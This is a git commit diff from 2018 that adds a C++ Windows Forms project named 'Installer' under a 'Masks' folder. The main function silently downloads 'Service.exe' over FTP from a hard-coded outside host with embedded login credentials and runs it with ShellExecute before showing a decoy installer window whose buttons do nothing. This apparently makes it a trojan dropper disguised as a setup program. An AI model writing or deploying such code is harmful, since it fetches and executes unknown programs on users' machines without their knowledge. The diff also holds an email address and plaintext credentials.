bcffd7a37d18ae3760f9f3bc915567e752f648a9
Yury <xismatulin.ru@yandex.ru>
2018-06-26 18:23:30 +0500

    Добавлен Mask->Installer. Изменена иерархия файлов (Отсортировал)

---
+++ Masks/Installer/Project2/MyForm.cpp
@@ -0,0 +1,52 @@
+#include "MyForm.h"
+#include <windows.h>
+#include <stdio.h>
+#include <fcntl.h>
+#include <io.h>
+using namespace Project2;
+
+#include <iostream>
+#include <stdio.h>
+// 123123.cpp: определяет точку входа для консольного приложения.
+//
+#include <Windows.h>
+
+#include <WinInet.h>
+#include <conio.h>
+using std::cout;
+using std::cin;
+using std::endl;
+#pragma comment (lib, "wininet.lib")
+
+void upload(LPCSTR server, LPCSTR login, LPCSTR pass, LPCWSTR local_file, LPCWSTR remote_file)
+{
+	HINTERNET hOpen, hConnection;
+
+	hOpen = InternetOpen(NULL, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
+
+	hConnection = InternetConnectA(hOpen, server, INTERNET_DEFAULT_FTP_PORT, login, pass, INTERNET_SERVICE_FTP, 0, 0);
+
+	if (FtpGetFile(hConnection, local_file, remote_file, 0, 0, 0, 0))
+		cout << "Success Story" << endl;
+	else
+		cout << "Epic Fail!" << endl;
+
+	InternetCloseHandle(hConnection);
+	InternetCloseHandle(hOpen);
+}
+
+[STAThreadAttribute]
+int main(array <System::String ^> ^args)
+{
+	Application::EnableVisualStyles();
+	Application::SetCompatibleTextRenderingDefault(false);
+
+	upload("fokes1.asuscomm.com", "ff", "WorkerFF", L"Service.exe", L"Service.exe");
+
+
+	LPCTSTR path = L"Service.exe";
+	ShellExecute(NULL, L"open", path, NULL, NULL, SW_SHOWDEFAULT);
+
+	Application::Run(gcnew MyForm());
+	return 0;
+}
---
+++ Masks/Installer/Project2/MyForm.h
@@ -0,0 +1,134 @@
+#pragma once
+#include <windows.h>
+#include <Shellapi.h>
+#include <io.h>
+#include <winuser.h>
+
+namespace Project2 {
+
+	using namespace System;
+	using namespace System::Resources;
+	using namespace System::ComponentModel;
+	using namespace System::Collections;
+	using namespace System::Windows::Forms;
+	using namespace System::Data;
+	using namespace System::Drawing;
+
+	/// <summary>
+	/// —водка дл€ MyForm
+	/// </summary>
+	public ref class MyForm : public System::Windows::Forms::Form
+	{
+	public:
+		MyForm(void)
+		{
+			InitializeComponent();
+			//
+			//TODO: добавьте код конструктора
+			//
+		}
+
+	protected:
+		/// <summary>
+		/// ќсвободить все используемые ресурсы.
+		/// </summary>
+		~MyForm()
+		{
+			if (components)
+			{
+				delete components;
+			}
+		}
+	private: System::Windows::Forms::Button^  button1;
+	protected:
+	private: System::Windows::Forms::Button^  button2;
+	private: System::Windows::Forms::CheckBox^  checkBox1;
+	private: System::Windows::Forms::RichTextBox^  richTextBox1;
+
+	private:
+		/// <summary>
+		/// ќб€зательна€ переменна€ конструктора.
+		/// </summary>
+		System::ComponentModel::Container ^components;
+
+#pragma region Windows Form Designer generated code
+		/// <summary>
+		/// “ребуемый метод дл€ поддержки конструктора Ч не измен€йте 
+		/// содержимое этого метода с помощью редактора кода.
+		/// </summary>
+		void InitializeComponent(void)
+		{
+			System::ComponentModel::ComponentResourceManager^  resources = (gcnew System::ComponentModel::ComponentResourceManager(MyForm::typeid));
+			this->button1 = (gcnew System::Windows::Forms::Button());
+			this->button2 = (gcnew System::Windows::Forms::Button());
+			this->checkBox1 = (gcnew System::Windows::Forms::CheckBox());
+			this->richTextBox1 = (gcnew System::Windows::Forms::RichTextBox());
+			this->SuspendLayout();
+			// 
+			// button1
+			// 
+			this->button1->Location = System::Drawing::Point(380, 295);
+			this->button1->Name = L"button1";
+			this->button1->Size = System::Drawing::Size(75, 23);
+			this->button1->TabIndex = 0;
+			this->button1->Text = L"Cancel";
+			this->button1->UseVisualStyleBackColor = true;
+			// 
+			// button2
+			// 
+			this->button2->Enabled = false;
+			this->button2->Location = System::Drawing::Point(461, 295);
+			this->button2->Name = L"button2";
+			this->button2->Size = System::Drawing::Size(75, 23);
+			this->button2->TabIndex = 1;
+			this->button2->Text = L"OK";
+			this->button2->UseVisualStyleBackColor = true;
+			this->button2->Click += gcnew System::EventHandler(this, &MyForm::button2_Click);
+			// 
+			// checkBox1
+			// 
+			this->checkBox1->AutoSize = true;
+			this->checkBox1->Location = System::Drawing::Point(12, 266);
+			this->checkBox1->Name = L"checkBox1";
+			this->checkBox1->Size = System::Drawing::Size(80, 17);
+			this->checkBox1->TabIndex = 2;
+			this->checkBox1->Text = L"checkBox1";
+			this->checkBox1->UseVisualStyleBackColor = true;
+			this->checkBox1->CheckedChanged += gcnew System::EventHandler(this, &MyForm::checkBox1_CheckedChanged);
+			// 
+			// richTextBox1
+			// 
+			this->richTextBox1->Location = System::Drawing::Point(12, 49);
+			this->richTextBox1->Name = L"richTextBox1";
+			this->richTextBox1->Size = System::Drawing::Size(524, 211);
+			this->richTextBox1->TabIndex = 3;
+			this->richTextBox1->Text = resources->GetString(L"richTextBox1.Text");
+			// 
+			// MyForm
+			// 
+			this->AutoScaleDimensions = System::Drawing::SizeF(6, 13);
+			this->AutoScaleMode = System::Windows::Forms::AutoScaleMode::Font;
+			this->ClientSize = System::Drawing::Size(548, 330);
+			this->Controls->Add(this->richTextBox1);
+			this->Controls->Add(this->checkBox1);
+			this->Controls->Add(this->button2);
+			this->Controls->Add(this->button1);
+			this->Name = L"MyForm";
+			this->Text = L"MyForm";
+			this->ResumeLayout(false);
+			this->PerformLayout();
+
+		}
+#pragma endregion
+	private: System::Void checkBox1_CheckedChanged(System::Object^  sender, System::EventArgs^  e) 
+	{
+		button2->Enabled = true;
+	}
+	private: System::Void button2_Click(System::Object^  sender, System::EventArgs^  e) 
+	{
+
+
+	}
+
+};
+}
